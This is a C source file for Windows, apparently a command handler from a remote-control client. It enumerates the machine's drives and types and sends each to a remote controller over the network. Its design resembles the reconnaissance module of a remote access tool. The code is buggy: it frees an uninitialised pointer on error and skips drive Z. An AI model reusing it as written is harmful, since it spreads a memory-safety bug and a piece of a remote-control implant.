#include <string.h>
#include <windows.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

#define COMMANDS_DISK_LIST_DATA 0xDF
#define COMMANDS_DISK_LIST_END 0xFB

int command_Desk_list(void)
{
	int i;
	int drives = GetLogicalDrives();
	char drivePath[5];
	uint32 driveInfo = 0;
	uint8* rmsg;

	for(i = 0; i != 'Z' - 'A'; i++)
	{
		if((drives & (1 << i)) != 0)
		{
			memset(drivePath, 0, 5);

			char driveLetter = 'A' + i;
			drivePath[1] = driveLetter;
			drivePath[2] = ':';
			drivePath[3] = '\\';
			drivePath[4] = '\0';

			driveInfo = GetDriveType(drivePath + 1);
			drivePath[0] = driveInfo;

			if(net_SendCmd((uint8*)drivePath, 5, COMMANDS_DISK_LIST_DATA) == NET_LOST_CONNECTION)
			{
				free(rmsg);

				return NET_LOST_CONNECTION;
			}

			if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
			{
				free(rmsg);

				return NET_LOST_CONNECTION;
			}

			free(rmsg);
			drivePath[0] = 0;
			drivePath[1] = 0;
		}
	}

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISK_LIST_END) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}